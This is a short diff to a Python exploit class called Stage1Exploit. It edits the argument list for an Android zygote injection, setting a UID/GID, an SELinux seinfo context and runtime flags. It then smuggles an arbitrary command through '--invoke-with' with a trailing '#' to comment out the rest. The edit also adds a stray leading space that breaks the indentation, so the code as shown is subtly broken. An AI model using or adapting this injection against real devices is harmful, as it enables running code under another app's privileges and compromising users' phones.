@@ -188,15 +188,14 @@ class Stage1Exploit:
         # commas don't work because they're treated as a separator
         assert "," not in command
         # TODO let you specify the SELinux context through command line arguments
-        raw_zygote_arguments = [
+         raw_zygote_arguments = [
             "--setuid=10079",
             "--setgid=10079",
             "--setgroups=3003",
-            "--target-sdk-version=28",
-            "--nice-name=com.qualcomm.qti.qms.service.trustzoneaccess",
             "--runtime-args",
-            "--seinfo=ssgapp:ssg_app:complete",
-            "--runtime-flags=32767",
+            "--seinfo=ssgapp:ssg_app:targetSdkVersion=28:complete",
+            "--runtime-flags=1",
+            "--nice-name=ssgapp",
             "--invoke-with",
             f"{command}#",
         ]
